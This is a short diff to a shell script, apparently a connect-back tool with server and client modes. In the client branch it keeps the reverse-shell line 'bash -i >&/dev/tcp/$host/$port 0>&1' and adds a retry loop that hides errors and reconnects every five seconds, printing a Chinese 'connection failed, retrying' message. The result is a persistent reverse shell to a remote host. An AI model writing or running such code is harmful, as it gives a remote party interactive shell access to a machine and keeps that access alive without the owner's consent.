@@ -69,5 +69,13 @@ if [[ "$start_type" == "server" ]]; then
 fi
 
 if [[ "$start_type" == "client" ]]; then
-    bash -i >&/dev/tcp/$host/$port 0>&1
+    while true; do
+        bash -i >&/dev/tcp/$host/$port 0>&1 2>/dev/null
+        if [[ $? -ne 0 ]]; then
+            echo "连接失败，正在重新尝试..."
+            sleep 5
+        else
+            break
+        fi
+    done
 fi
